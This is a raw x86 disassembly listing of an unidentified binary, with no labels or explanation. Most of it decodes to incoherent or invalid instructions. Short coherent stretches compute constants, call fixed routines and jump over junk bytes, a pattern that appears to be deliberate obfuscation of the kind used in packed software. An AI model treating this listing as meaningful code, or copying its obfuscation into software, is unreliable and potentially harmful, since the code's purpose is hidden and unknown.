  40dda9:	mov    ah,0x3
  40ddab:	and    al,0x47
  40ddad:	jge    0x40dd82
  40ddaf:	pop    ecx
  40ddb0:	ror    BYTE PTR [edi-0x454389d9],0xba
  40ddb7:	fwait
  40ddb8:	out    0x48,eax
  40ddba:	ins    BYTE PTR es:[edi],dx
  40ddbb:	js     0x40ddb2
  40ddbd:	jb     0x40ddcc
  40ddbf:	lods   al,BYTE PTR ds:[esi]
  40ddc0:	jnp    0x40de22
  40ddc2:	mov    esp,0xdadc6a72
  40ddc7:	cmp    ebp,ebp
  40ddc9:	and    ecx,edi
  40ddcb:	(bad)  
  40ddcc:	rcr    dh,0x8d
  40ddcf:	pop    ebp
  40ddd0:	xchg   ecx,eax
  40ddd1:	popa   
  40ddd2:	xchg   BYTE PTR [ebp+0x7631f435],ch
  40ddd8:	(bad)  
  40ddd9:	mov    edx,0xd89bcfed
  40ddde:	ffreep st(0)
  40dde0:	popf   
  40dde1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde2:	mov    ch,0x2d
  40dde4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde5:	es jns 0x40ddcb
  40dde8:	fucomip st,st(4)
  40ddea:	fstp   QWORD PTR ds:0xa2cd48de
  40ddf0:	pop    esp
  40ddf1:	cmp    BYTE PTR [edx-0x2a1575a],dh
  40ddf7:	xchg   edx,eax
  40ddf8:	pop    esi
  40ddf9:	icebp  
  40ddfa:	addr16 push ebx
  40ddfc:	push   ebp
  40ddfd:	xchg   DWORD PTR [edi+0x680e8ded],ebx
  40de03:	or     BYTE PTR [esi],bl
  40de05:	inc    ebp
  40de06:	xchg   DWORD PTR [ebx-0x6d],esi
  40de09:	mov    cl,0x94
  40de0b:	push   DWORD PTR [ebx]
  40de0d:	push   0xe495cffb
  40de12:	dec    ebx
  40de13:	mov    fs,WORD PTR [eax+0x537209d0]
  40de19:	ret    
  40de1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de1b:	jns    0x40ddf5
  40de1d:	in     eax,dx
  40de1e:	fsub   DWORD PTR [edx-0x624cfacf]
  40de24:	nop
  40de25:	inc    eax
  40de26:	cli    
  40de27:	nop
  40de28:	push   esp
  40de29:	(bad)  
  40de2a:	lock ins DWORD PTR es:[edi],dx
  40de2c:	xor    ecx,esi
  40de2e:	lods   eax,DWORD PTR ds:[esi]
  40de30:	stos   BYTE PTR es:[edi],al
  40de31:	or     eax,0x8cf5c00c
  40de36:	not    DWORD PTR [ebp+0x808dfc8]
  40de3c:	out    dx,eax
  40de3d:	mov    ecx,0xf6afb6df
  40de42:	int3   
  40de43:	mov    al,ds:0x821b58f8
  40de48:	sub    bh,BYTE PTR [edi]
  40de4a:	sbb    BYTE PTR [ebp+0x7c],ah
  40de4d:	cld    
  40de4e:	jg     0x40de00
  40de50:	sub    BYTE PTR [ebx-0x60e9155],0xcf
  40de57:	(bad)
  40de5b:	or     al,0x75
  40de5d:	xor    BYTE PTR [eax+eiz*2],dh
  40de60:	inc    esi
  40de61:	stos   DWORD PTR es:[edi],eax
  40de62:	sub    ch,BYTE PTR [eax+ebp*4+0x3f]
  40de66:	mov    edx,0xeda9886f
  40de6b:	lods   eax,DWORD PTR ds:[esi]
  40de6c:	inc    ebp
  40de6d:	inc    ecx
  40de6e:	pop    esi
  40de6f:	ds push edi
  40de71:	shl    DWORD PTR [eax+0x6e],1
  40de74:	inc    eax
  40de75:	jmp    0x60f1:0xcd9d4e2a
  40de7c:	pushf  
  40de7d:	(bad)  
  40de7e:	jmp    0x9d5515d4
  40de83:	inc    ebp
  40de84:	outs   dx,DWORD PTR ds:[esi]
  40de85:	inc    eax
  40de86:	jl     0x40de27
  40de88:	cld    
  40de89:	test   DWORD PTR [ebx+edx*2],esp
  40de8c:	fwait
  40de8d:	test   DWORD PTR [eax+0x23],ecx
  40de90:	ss jae 0x40de62
  40de93:	xor    DWORD PTR [ebx-0x26491a4d],esp
  40de99:	int3   
  40de9a:	add    ebx,ebp
  40de9c:	mov    edx,0xbf0ae415
  40dea1:	xchg   edi,eax
  40dea2:	sar    DWORD PTR [esi+edi*4+0x7857a3d8],0x34
  40deaa:	mov    DWORD PTR [ebp-0x18],0x524d
  40deb1:	mov    DWORD PTR [ebp-0x14],0x1600
  40deb8:	mov    eax,DWORD PTR [ebp-0x18]
  40debb:	mov    ecx,DWORD PTR [ebp-0x14]
  40debe:	mov    edx,DWORD PTR [ebp-0x10]
  40dec1:	mov    edi,DWORD PTR [ebp-0xc]
  40dec4:	push   edi
  40dec5:	push   edx
  40dec6:	push   ecx
  40dec7:	push   eax
  40dec8:	call   0x41594e
  40decd:	mov    ecx,DWORD PTR [ebp-0x8]
  40ded0:	mov    edi,DWORD PTR [ebp-0x4]
  40ded3:	add    eax,0x1dc8
  40ded8:	adc    edx,0x6fbf
  40dede:	and    edx,edi
  40dee0:	push   0x1061
  40dee5:	and    eax,ecx
  40dee7:	or     edx,0x23ff
  40deed:	push   0x4000022f
  40def2:	or     eax,0x58c4
  40def7:	xor    edx,0x7a7a
  40defd:	xor    eax,0x5278
  40df02:	push   edx
  40df03:	push   eax
  40df04:	call   0x422220
  40df09:	jmp    0x40e198
  40df0e:	and    eax,0x8c7544dd
  40df13:	jnp    0x40df51
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	fs aam 0x9e
  40df19:	nop
  40df1a:	popa   
  40df1b:	mov    al,0x8c
  40df1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df1e:	push   ss
  40df1f:	cld    
  40df20:	mov    esi,0xbec299be
  40df25:	mov    esi,0x91f0b188
  40df2a:	pop    ss
  40df2b:	sub    edi,DWORD PTR ds:0xfc513734
  40df31:	sub    BYTE PTR [ebx+0x57e4a70b],al
  40df37:	das    
  40df38:	pop    ebp
  40df39:	jecxz  0x40dfa5
  40df3b:	ret    0xcfd0
  40df3e:	ror    dh,1
  40df40:	jg     0x40dfa9
  40df42:	add    al,0xfb
  40df44:	or     BYTE PTR [edx+0x6b],al
  40df47:	sub    eax,0x40ea015f
  40df4c:	dec    ecx
  40df4d:	push   edi
  40df4e:	lock bound ebx,QWORD PTR [ebx]
  40df51:	and    ch,BYTE PTR gs:[esi]
  40df54:	cmp    eax,0x1eceb05f
  40df59:	sbb    dl,BYTE PTR [esi-0x3868dcdb]
  40df5f:	hlt    
  40df60:	mov    cs,WORD PTR [esi-0xd9b28e6]
  40df66:	iret   
  40df67:	iret   
  40df68:	test   eax,0xf1f6b8d
  40df6d:	sar    DWORD PTR fs:[ebx-0x7e],1
  40df71:	add    eax,0x5b0b9952
  40df76:	sbb    al,0x26
  40df78:	out    dx,al
  40df79:	cld    
  40df7a:	call   0x8c2cb88
  40df7f:	dec    esp
  40df80:	adc    DWORD PTR [bx+si+0x7c4],eax
  40df85:	pop    ecx
  40df86:	scas   eax,DWORD PTR es:[edi]
  40df87:	mov    ebp,0xa475aa4f
  40df8c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40df8e:	shr    DWORD PTR [esi-0x4f],1
  40df91:	pop    ecx
  40df92:	inc    ebp
  40df93:	das    
  40df94:	jl     0x40dfd1
  40df96:	mov    dh,0x73
  40df98:	sbb    edi,DWORD PTR [edx+0x14]
  40df9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df9c:	pop    ss
  40df9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df9e:	add    eax,0x7ce5b921
  40dfa3:	jmp    0x4aa70ee4
  40dfa8:	scas   eax,DWORD PTR es:[edi]
  40dfa9:	cwde   
  40dfaa:	aam    0x69
  40dfac:	xor    eax,0x8a3e8455
  40dfb1:	xchg   DWORD PTR [ebx],esi
  40dfb3:	es sub eax,ebx
  40dfb6:	sub    ecx,DWORD PTR [eax]
  40dfb8:	sub    eax,0xa1c9c0ca
  40dfbd:	nop
  40dfbe:	shr    edx,cl
  40dfc0:	test   al,0xad
  40dfc2:	pop    ecx
  40dfc3:	pop    ebp
  40dfc4:	fidivr WORD PTR [ebp-0x7d7c5c97]
  40dfca:	xchg   edi,eax
  40dfcb:	dec    ebx
  40dfcc:	adc    BYTE PTR [eax],ch
  40dfce:	mov    cl,0x32
  40dfd0:	ja     0x40e030
  40dfd2:	push   0xffffff8c
  40dfd4:	aam    0xa0
  40dfd6:	jno    0x40df5f
  40dfd8:	push   ecx
  40dfd9:	js     0x40df69
  40dfdb:	mov    al,0xd0
  40dfdd:	and    al,0x3a
  40dfdf:	mov    DWORD PTR [ebp+0x2],esi
  40dfe2:	dec    edx
  40dfe3:	adc    BYTE PTR [esp+eax*2],dl
  40dfe6:	mov    ah,0x6c
  40dfe8:	add    BYTE PTR [ecx+0x70],0x62
  40dfec:	not    DWORD PTR [ecx-0x32]
  40dfef:	dec    eax
  40dff0:	add    DWORD PTR [edx],esi
  40dff2:	jmp    0x78f362e2
  40dff7:	push   ds
  40dff8:	fdivr  DWORD PTR [ebp+0x432fe20]
  40dffe:	push   ds
  40dfff:	daa    
  40e000:	cmp    eax,0x28ec4637
  40e005:	jmp    0x40e015
  40e007:	xchg   edx,eax
  40e008:	push   cs
  40e009:	adc    eax,0x33d8196d
  40e00e:	xor    DWORD PTR ds:0xb15769f,0x3fa8502a
  40e018:	jl     0x40dfb4
  40e01a:	lds    esp,FWORD PTR [edx]
  40e01c:	pop    edi
  40e01d:	loopne 0x40dfbd
  40e01f:	clc    
  40e020:	sbb    DWORD PTR [ecx],0xdc726bff
  40e026:	pop    ebx
  40e027:	lods   eax,DWORD PTR ds:[esi]
  40e028:	or     eax,0x1b9a5a9f
  40e02d:	pop    ds
  40e02e:	ret    
  40e02f:	sub    ebx,DWORD PTR [ecx-0x6561b867]
  40e035:	pop    ss
  40e036:	sbb    dh,BYTE PTR [edx+0xb8b4a3d]
  40e03c:	add    DWORD PTR [ecx-0x11],ecx
  40e03f:	mov    al,BYTE PTR [ebx-0x4e12cb01]
  40e045:	sbb    BYTE PTR [edx],al
  40e047:	popf   
  40e048:	add    DWORD PTR [esi+ebp*2-0x41ce43e8],0x6391fa74
  40e053:	loope  0x40e098
  40e055:	push   ss
  40e056:	xor    ecx,ebp
  40e058:	mov    ebx,0xe2316e4
  40e05d:	pop    eax
  40e05e:	sub    BYTE PTR [eax-0x15],dl
  40e061:	fs hlt 
  40e063:	xchg   esp,eax
  40e064:	loopne 0x40e0d7
  40e066:	cdq    
  40e067:	xchg   ecx,eax
  40e068:	cwde   
  40e069:	push   cs
  40e06a:	sbb    DWORD PTR [eax-0x7455ce6e],ecx
  40e070:	shl    DWORD PTR [esi],cl
  40e072:	pusha  
  40e073:	sbb    esi,ebp
  40e075:	retf   
  40e076:	mov    edx,0x2169937b
  40e07b:	ficomp WORD PTR [edi]
  40e07d:	jmp    0xfbfe:0x2926166a
  40e084:	aas    
  40e085:	shl    esp,0x1f
  40e088:	shl    DWORD PTR [ecx],1
  40e08a:	sahf   
  40e08b:	or     cl,BYTE PTR [ecx]
  40e08d:	mov    al,0xfe
  40e08f:	mov    DWORD PTR [ecx+0x50],ebp
  40e092:	js     0x40e068
  40e094:	inc    edx
  40e095:	fisubr WORD PTR [esi+0x15]
  40e098:	push   ds
  40e099:	push   0xffffff93
  40e09b:	push   edi
  40e09c:	es jp  0x40e06e
  40e09f:	scas   al,BYTE PTR es:[edi]
  40e0a0:	mov    bl,0xd3
  40e0a2:	mov    ah,0x4b
  40e0a4:	inc    edx
  40e0a5:	aad    0xa4
  40e0a7:	sub    BYTE PTR fs:[edx+0x79],bh
  40e0ab:	stc    
  40e0ac:	push   ss
  40e0ad:	jno    0x40e0f8
  40e0af:	mov    eax,ss:0x3b02ed78
  40e0b5:	mov    esp,0xd509af2a
  40e0ba:	xchg   edx,ecx
  40e0bc:	cdq    
  40e0bd:	push   es
  40e0be:	inc    edi
  40e0bf:	xchg   ebp,eax
  40e0c0:	adc    edi,esi
  40e0c2:	cmp    cl,ch
  40e0c4:	lods   eax,DWORD PTR ds:[esi]
  40e0c5:	out    dx,al
  40e0c6:	ret    0x76b
  40e0c9:	es jp  0x40e083
  40e0cc:	inc    esi
  40e0cd:	fmulp  st(5),st
  40e0cf:	nop
  40e0d0:	inc    eax
  40e0d1:	or     DWORD PTR ds:0xdc4d2f0c,edi
  40e0d7:	pop    edi
  40e0d8:	in     eax,dx
  40e0d9:	add    ch,BYTE PTR [esi+0x34]
  40e0dc:	ja     0x40e071
  40e0de:	jmp    0x40e121
  40e0e0:	in     al,dx
  40e0e1:	pusha  
  40e0e2:	or     al,0x2c
  40e0e4:	test   al,0x28
  40e0e6:	xchg   edi,eax
  40e0e7:	mov    eax,0x36b5f5e1
  40e0ec:	adc    esi,DWORD PTR [edx]
  40e0ee:	lea    edi,[eax-0x5302093e]
  40e0f4:	adc    ecx,DWORD PTR [eax-0x1c]
  40e0f7:	pop    ecx
  40e0f8:	and    bh,BYTE PTR [edx+ebp*2]
  40e0fb:	pop    es
  40e0fc:	shl    bl,cl
  40e0fe:	or     al,0x3a
  40e100:	xor    al,0x7e
  40e102:	inc    edi
  40e103:	add    BYTE PTR [ebx+0x72482193],0xea
  40e10a:	pop    ss
  40e10b:	sbb    eax,0xf2ab1694
  40e110:	(bad)  
  40e111:	and    DWORD PTR [edi],edx
  40e113:	pushf  
  40e114:	sbb    al,0xe
  40e116:	fistp  DWORD PTR [ebx]
  40e118:	mov    DWORD PTR [eax],edi
  40e11a:	adc    eax,0x7407387b
  40e11f:	rcl    BYTE PTR [ebx-0x4d],1
  40e122:	sbb    al,0x2c
  40e124:	in     al,0x29
  40e126:	or     cl,BYTE PTR [esi-0x5b]
  40e129:	sar    DWORD PTR [ecx],1
  40e12b:	pop    eax
  40e12c:	(bad)  
  40e12d:	dec    ecx
  40e12e:	in     al,0xb8
  40e130:	aas    
  40e131:	or     dl,cl
  40e133:	iret   
  40e134:	stos   BYTE PTR es:[edi],al
  40e135:	popf   
  40e136:	retf   
  40e137:	dec    edi
  40e138:	aad    0xb5
  40e13a:	jo     0x40e16d
  40e13c:	lahf   
  40e13d:	mov    ah,BYTE PTR [edi+0x3f9c60b4]
  40e143:	mov    bl,0x6b
  40e145:	mov    esi,0xceb09087
  40e14a:	aad    0x41
  40e14c:	dec    eax
  40e14d:	mov    ds:0x56d8296f,eax
  40e152:	ss repz icebp 
  40e155:	add    ecx,DWORD PTR [eax+0x5a155bfc]
  40e15b:	and    al,0x1e
  40e15d:	push   ebp
  40e15e:	pop    ds
  40e15f:	adc    BYTE PTR [ebp+edx*1+0x35],0xf2
  40e164:	sbb    eax,0x8d2e8d5b
  40e169:	add    eax,0x1617f358
  40e16e:	sbb    DWORD PTR [ebx-0x24f465e3],ecx
  40e174:	test   esp,edi
  40e176:	sbb    eax,0x7d2fb6b7
  40e17b:	cs push ecx
  40e17d:	repnz sbb eax,0xe8224533
  40e183:	in     eax,0x2
  40e185:	pop    esp
  40e186:	shl    BYTE PTR [ecx],0x6a
  40e189:	cmp    BYTE PTR [ecx+0x35],0xf0
  40e18d:	push   edi
  40e18e:	add    BYTE PTR [ecx+esi*2-0x67],al
  40e192:	sub    al,0xa4
  40e194:	xor    DWORD PTR [ebx],0x29
  40e197:	adc    DWORD PTR [ecx-0x1fba38fa],ecx
  40e19d:	push   esp
  40e19e:	xor    eax,DWORD PTR [eax]
  40e1a0:	add    bh,al
  40e1a2:	inc    ebp
  40e1a3:	in     al,0x8c
  40e1a5:	jge    0x40e1a7
  40e1a7:	add    bh,al
  40e1a9:	inc    ebp
  40e1aa:	call   0x411ee5
  40e1af:	mov    DWORD PTR [ebp-0x14],0x51ef
  40e1b6:	xor    edi,edi
  40e1b8:	mov    DWORD PTR [ebp-0xc],0x3358
  40e1bf:	push   0xc9f
  40e1c4:	jmp    0x40e453
  40e1c9:	jecxz  0x40e232
  40e1cb:	fscale 
  40e1cd:	pop    edx
  40e1ce:	mov    ah,0x3c
  40e1d0:	lods   al,BYTE PTR ds:[esi]
  40e1d1:	je     0x40e1fd
  40e1d3:	push   eax
  40e1d4:	sahf   
  40e1d5:	pop    ds
  40e1d6:	xchg   esi,eax
  40e1d7:	bound  ebx,QWORD PTR [esi-0x4141fd0f]
  40e1dd:	cdq    
  40e1de:	ret    0xbebe
  40e1e1:	(bad)  
  40e1e2:	sbb    edx,DWORD PTR [edi-0x77]
  40e1e5:	jns    0x40e1be
  40e1e7:	test   eax,0xa1e60cba
  40e1ec:	sub    al,BYTE PTR [esi+0x3c]
  40e1ef:	not    DWORD PTR [esi-0xc]
  40e1f2:	fist   WORD PTR [esi+0x60]
  40e1f5:	pop    ecx
  40e1f6:	test   al,0x85
  40e1f8:	fisub  DWORD PTR ds:0xacadfc47
  40e1fe:	pusha  
  40e1ff:	retf   
  40e200:	jmp    0xed65:0x80fee5ef
  40e207:	(bad)  
  40e208:	inc    eax
  40e209:	or     dl,ch
  40e20b:	fnstenv [ebx]
  40e20d:	push   0xfffffffe
  40e20f:	push   ebx
  40e210:	pop    esp
  40e211:	push   ds
  40e212:	pop    es
  40e213:	push   0x30e56f12
  40e218:	fwait
  40e219:	pusha  
  40e21a:	xchg   esp,eax
  40e21b:	mov    bh,0x96
  40e21d:	sbb    DWORD PTR ss:0x673bc4a2,esi
  40e224:	xchg   edx,eax
  40e225:	inc    esp
  40e226:	adc    al,0xca
  40e228:	sub    eax,0x5d61692
  40e22d:	inc    edx
  40e22e:	sub    eax,0x8044261
  40e233:	cwde   
  40e234:	mov    ebp,eax
  40e236:	in     al,0xb5
  40e238:	pushf  
  40e239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e23a:	push   esi
  40e23b:	mul    BYTE PTR [edx+ecx*4-0x7fa4e612]
  40e242:	ins    BYTE PTR es:[edi],dx
  40e243:	cwde   
  40e244:	cli    
  40e245:	jg     0x40e264
  40e247:	test   BYTE PTR [edx+0x4dbb8cfa],bh
  40e24d:	sub    eax,0xa49bfb63
  40e252:	mov    eax,ds:0x9ef9000d
  40e257:	loopne 0x40e1d9
  40e259:	cld    
  40e25a:	(bad)  
  40e25b:	out    dx,eax
  40e25c:	imul   DWORD PTR [ebp-0x6ce8bde1]
  40e262:	arpl   WORD PTR [ecx],bx
  40e264:	xor    eax,0xf1520d82
  40e269:	dec    edi
  40e26a:	dec    ecx
  40e26b:	int3   
  40e26c:	retf   0xc5fd
  40e26f:	test   BYTE PTR [esi-0x24aca490],0x45
  40e276:	loopne 0x40e2e3
  40e278:	mov    ebx,0xfac294ef
  40e27d:	lods   al,BYTE PTR ds:[esi]
  40e27e:	data16 int3 
  40e280:	dec    esi
  40e281:	pop    esi
  40e282:	outs   dx,BYTE PTR ds:[esi]
  40e283:	inc    esp
  40e284:	or     BYTE PTR [esi+ebp*1+0x5e],al
  40e288:	leave  
  40e289:	inc    ebp
  40e28a:	xor    eax,DWORD PTR [edi]
  40e28c:	cwde   
  40e28d:	sbb    ecx,edx
  40e28f:	mov    ah,ah
  40e291:	(bad)  
  40e292:	js     0x40e30b
  40e294:	pop    esi
  40e295:	ins    BYTE PTR es:[edi],dx
  40e296:	dec    ecx
  40e297:	je     0x40e2d7
  40e299:	xor    DWORD PTR [eax-0x64],edi
  40e29c:	sbb    al,0xda
  40e29e:	xor    DWORD PTR [eiz*4+0x63eb2117],ecx
  40e2a5:	daa    
  40e2a6:	mov    cl,0x15
  40e2a8:	or     al,0x93
  40e2aa:	mov    edi,0x7ae958c8
  40e2af:	out    dx,al
  40e2b0:	les    ebp,FWORD PTR [ecx]
  40e2b2:	outs   dx,BYTE PTR ds:[esi]
  40e2b3:	rcl    DWORD PTR [edx+0x35],0x56
  40e2b7:	cs ja  0x40e2b1
  40e2ba:	or     cl,BYTE PTR [ebp+0x4d]
  40e2bd:	push   0xaa782c1e
  40e2c2:	stos   BYTE PTR es:[edi],al
  40e2c3:	sbb    dl,BYTE PTR [edi-0x1f249aa9]
  40e2c9:	or     BYTE PTR [ebx-0x1694db51],dh
  40e2cf:	inc    edx
  40e2d0:	or     al,bh
  40e2d2:	int    0xdb
  40e2d4:	pop    esp
  40e2d5:	pop    esp
  40e2d6:	sub    ebp,DWORD PTR [edi-0x687d9245]
  40e2dc:	sbb    ebx,DWORD PTR [eax-0xd476e5f]
  40e2e2:	call   0x8d989889
  40e2e7:	inc    ebp
  40e2e8:	loope  0x40e2b0
  40e2ea:	stc    
  40e2eb:	les    ecx,FWORD PTR [esi]
  40e2ed:	scas   eax,DWORD PTR es:[edi]
  40e2ee:	ficom  WORD PTR [ecx+0x5661d424]
  40e2f4:	fadd   QWORD PTR [ebx+0x8af57ab]
  40e2fa:	je     0x40e371
  40e2fc:	jo     0x40e302
  40e2fe:	xchg   ecx,eax
  40e2ff:	test   BYTE PTR [ecx+0x6cb90079],dl
  40e305:	and    al,ah
  40e307:	(bad)  
  40e308:	adc    eax,0xd0fd1bc3
  40e30d:	adc    al,0xac
  40e30f:	jae    0x40e2fb
  40e311:	dec    edx
  40e312:	fwait
  40e313:	stc    
  40e314:	jecxz  0x40e330
  40e316:	imul   eax,DWORD PTR ds:0x78f189ca,0x7889ccc7
  40e320:	xchg   edi,eax
  40e321:	jecxz  0x40e354
  40e323:	(bad)  
  40e324:	xor    esp,DWORD PTR [ecx-0x4f]
  40e327:	add    eax,0x85451b29
  40e32c:	bound  esp,QWORD PTR [esp+eax*1+0x1c]
  40e330:	jl     0x40e349
  40e332:	xchg   esp,eax
  40e333:	fdivr  QWORD PTR ds:0x92298e66
  40e339:	iret   
  40e33a:	jb     0x40e2c8
  40e33c:	call   0xa85b:0x675debe7
  40e343:	js     0x40e2e0
  40e345:	sub    eax,0xb9297837
  40e34a:	test   ebp,edi
  40e34c:	stos   BYTE PTR es:[edi],al
  40e34d:	and    eax,0xac1e530a
  40e352:	(bad)  
  40e353:	mov    al,ds:0x66313647
  40e358:	mov    ch,0xbc
  40e35a:	xchg   edx,eax
  40e35b:	add    eax,DWORD PTR [edi+0x64]
  40e35e:	jmp    0x69af:0x89e0709c
  40e365:	jo     0x40e336
  40e367:	das    
  40e368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e369:	push   0xfca5b5c4
  40e36e:	cmc    
  40e36f:	int3   
  40e370:	fsubr  QWORD PTR [ebp-0x586ab4b8]
  40e376:	xlat   BYTE PTR ds:[ebx]
  40e377:	push   edx
  40e378:	out    dx,eax
  40e379:	push   eax
  40e37a:	xchg   bl,bl
  40e37c:	pushf  
  40e37d:	mov    ecx,esi
  40e37f:	mov    cl,BYTE PTR [ecx-0x6e]
  40e382:	mov    ebx,DWORD PTR [ebp+0x58ac39c7]
  40e388:	jne    0x40e342
  40e38a:	arpl   WORD PTR [edx],sp
  40e38c:	jo     0x40e403
  40e38e:	les    esi,FWORD PTR [ecx+0x2b2f452e]
  40e394:	daa    
  40e395:	xor    DWORD PTR [ecx-0x7812926b],edi
  40e39b:	mov    esi,0xaaf99d09
  40e3a0:	xor    eax,0xf1b81372
  40e3a5:	in     al,dx
  40e3a6:	xor    al,0x6f
  40e3a8:	cld    
  40e3a9:	(bad)  
  40e3aa:	(bad)  
  40e3ab:	jns    0x40e3a0
  40e3ad:	mov    ah,0xda
  40e3af:	mov    ds:0xaea415a4,eax
  40e3b4:	pminsw mm7,QWORD PTR es:[ebx-0x4e8a4c8]
  40e3bc:	fs in  al,dx
  40e3be:	pop    eax
  40e3bf:	fwait
  40e3c0:	retf   0x9524
  40e3c3:	push   0x47
  40e3c5:	adc    ecx,esp
  40e3c7:	outs   dx,DWORD PTR ds:[esi]
  40e3c8:	pop    eax
  40e3c9:	scas   eax,DWORD PTR es:[edi]
  40e3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3cb:	hlt    
  40e3cc:	push   edx
  40e3cd:	js     0x40e3bd
  40e3cf:	pop    ss
  40e3d0:	out    dx,eax
  40e3d1:	pop    edx
  40e3d2:	fdivr  DWORD PTR [ecx+0x54]
  40e3d5:	dec    esi
  40e3d6:	jmp    0xd3ba35d
  40e3db:	and    DWORD PTR [edi],ebp
  40e3dd:	or     ebp,DWORD PTR [eax+0xc94c779]
  40e3e3:	jne    0x40e3ad
  40e3e5:	xchg   edx,eax
  40e3e6:	inc    eax
  40e3e7:	mov    dl,0x5e
  40e3e9:	bound  ebp,QWORD PTR [edi+0x90d707f]
  40e3ef:	push   ebp
  40e3f0:	stos   BYTE PTR es:[edi],al
  40e3f1:	enter  0x4520,0xf2
  40e3f5:	ds and eax,0x6199af1e
  40e3fb:	push   edx
  40e3fc:	(bad)  
  40e3fd:	mov    WORD PTR [eax],ss
  40e3ff:	mov    esp,0x8f52155b
  40e404:	mov    ah,0x59
  40e406:	int    0x96
  40e408:	add    esp,eax
  40e40a:	sub    DWORD PTR [ebx-0x5111424],edx
  40e410:	xchg   ebx,eax
  40e411:	sti    
  40e412:	dec    ecx
  40e413:	jecxz  0x40e428
  40e415:	std    
  40e416:	push   ecx
  40e417:	pop    ecx
  40e418:	and    BYTE PTR [ecx],dl
  40e41a:	dec    ebx
  40e41b:	pop    esi
  40e41c:	out    0x84,al
  40e41e:	inc    esi
  40e41f:	pop    ss
  40e420:	daa    
  40e421:	call   FWORD PTR [esi+0x1d]
  40e424:	and    eax,0x5b9ffebc
  40e429:	into   
  40e42a:	or     DWORD PTR [edi],eax
  40e42c:	xlat   BYTE PTR ds:[ebx]
  40e42d:	lods   eax,DWORD PTR ds:[esi]
  40e42e:	mov    eax,0xcafbbe65
  40e433:	mov    DWORD PTR [esi+0x6d],ebp
  40e436:	mov    ecx,0x29f4b15b
  40e43b:	xor    eax,0x724694cb
  40e440:	or     eax,0x3e533d51
  40e445:	stc    
  40e446:	and    esi,DWORD PTR [eax]
  40e448:	push   edx
  40e449:	jno    0x40e3ff
  40e44b:	mov    esi,0x6c9cba0e
  40e450:	cmp    BYTE PTR [eax+ecx*2+0x47],ah
  40e454:	mov    DWORD PTR [ebp-0x4],edi
  40e457:	mov    eax,DWORD PTR [ebp-0x18]
  40e45a:	mov    ecx,DWORD PTR [ebp-0x14]
  40e45d:	push   0x1c19
  40e462:	push   ecx
  40e463:	push   eax
  40e464:	call   0x41594e
  40e469:	mov    ecx,DWORD PTR [ebp-0x20]
  40e46c:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e46f:	or     eax,ecx
  40e471:	or     edx,ebx
  40e473:	push   0x20fa
  40e478:	add    eax,0x7fac
  40e47d:	push   0x1cd48ab
  40e482:	adc    edx,0x133b
  40e488:	push   edx
  40e489:	push   eax
  40e48a:	call   0x422220
  40e48f:	mov    ebx,DWORD PTR [ebp-0x4]
  40e492:	lea    ecx,[eax-0x5d40]
  40e498:	xor    edx,edx
  40e49a:	mov    eax,0x16c2
  40e49f:	div    ebx
  40e4a1:	mov    edx,DWORD PTR [ebp-0xc]
  40e4a4:	sub    eax,edx
  40e4a6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  40e4ad:	mov    DWORD PTR [ebp-0x14],0x6af0
  40e4b4:	mov    DWORD PTR [ebp-0x4],edi
  40e4b7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  40e4be:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4c1:	mov    eax,0x4401
  40e4c6:	sub    eax,ecx
  40e4c8:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4cb:	xor    edx,edx
  40e4cd:	div    ecx
  40e4cf:	mov    ecx,DWORD PTR [ebp-0x14]
  40e4d2:	xor    eax,0xa80
  40e4d7:	or     eax,0x343b
  40e4dc:	or     eax,ecx
  40e4de:	mov    ecx,DWORD PTR [ebp+0x8]
  40e4e1:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  40e4e8:	mov    DWORD PTR [ebp-0xc],0x327f
  40e4ef:	mov    DWORD PTR [ebp-0x14],0x5215
  40e4f6:	mov    DWORD PTR [ebp+0x8],0x2502
  40e4fd:	mov    eax,DWORD PTR [ebp+0x8]
  40e500:	add    eax,DWORD PTR [ebp-0x14]
  40e503:	mov    ecx,DWORD PTR [ebp-0xc]
  40e506:	and    eax,0x2bab
  40e50b:	lea    eax,[eax+ecx*1-0x557f]
  40e512:	mov    ecx,DWORD PTR [ebp+0xc]
  40e515:	mov    DWORD PTR [esi+eax*4],ecx
  40e518:	mov    DWORD PTR [ebp-0xc],edi
  40e51b:	mov    DWORD PTR [ebp+0x8],0x5f40
  40e522:	mov    DWORD PTR [ebp-0x14],0x6ba4
  40e529:	mov    DWORD PTR [ebp+0xc],0x7b17
  40e530:	mov    ecx,DWORD PTR [ebp+0x8]
  40e533:	jmp    0x40e7c2
  40e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e539:	jno    0x40e4dc
  40e53b:	into   
  40e53c:	mov    ecx,0xb6b9b90d
  40e541:	jb     0x40e5b1
  40e543:	fst    st(4)
  40e545:	pushf  
  40e546:	pop    edx
  40e547:	ror    ebp,1
  40e549:	push   es
  40e54a:	mov    esi,0xbec299be
  40e54f:	mov    esi,0xd93703bd
  40e554:	(bad)  
  40e555:	nop
  40e556:	fs cli 
  40e558:	dec    esi
  40e559:	cmp    eax,0x4de43634
  40e55e:	addr16 call 0x30e612f1
  40e564:	out    dx,al
  40e565:	es stc 
  40e567:	aam    0x9a
  40e569:	pop    eax
  40e56a:	lahf   
  40e56b:	xlat   BYTE PTR ds:[ebx]
  40e56c:	mov    al,ds:0x76324ed2
  40e571:	ror    DWORD PTR [eax-0x32],1
  40e574:	and    al,0xe
  40e576:	cli    
  40e577:	call   0x956ac2b4
  40e57c:	call   0x7f8f8b3c
  40e581:	loop   0x40e52b
  40e583:	repz cld 
  40e585:	ins    BYTE PTR es:[edi],dx
  40e586:	mov    ah,0x56
  40e588:	loop   0x40e57c
